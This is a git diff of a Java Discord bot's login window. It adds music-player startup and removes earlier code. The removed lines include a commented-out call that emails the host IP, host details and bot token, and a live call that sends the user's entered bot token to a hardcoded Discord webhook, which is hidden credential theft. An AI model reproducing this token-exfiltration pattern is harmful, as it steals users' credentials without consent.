@@ -4,7 +4,9 @@ import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
-import me.comu.exeter.wrapper.Wrapper;
+import me.comu.exeter.musicplayer.AudioPlayerSendHandler;
+import me.comu.exeter.musicplayer.PlayerManager;
+import me.comu.exeter.musicplayer.TrackScheduler;
 import me.duncte123.botcommons.web.WebUtils;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Activity;
@@ -218,18 +220,18 @@ class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new BlacklistedWordsEvent());
                 jda.addEventListener(new SnipeEvent());
                 jda.addEventListener(new ReactionRoleEvent());
+                TrackScheduler.startAudioManager(PlayerManager.buildMusicPlayer(AudioPlayerSendHandler.musicHook));
                 logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
-//                Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
-                Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz", jTokenField.getText());
                 running = true;
             } catch (LoginException login) {
                 jStatusField.setText("Invalid Token");
+                login.printStackTrace();
             } catch (Exception ex) {
                 ex.printStackTrace();
                 running = true;
                 jStatusField.setText("Gateway Connection Throttle | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
-//                    logger.info("Caught Exception! Likely Cause: LoginException");
+                    ex.printStackTrace();
             }
         }
         if (e.getSource().equals(stopButton)) {
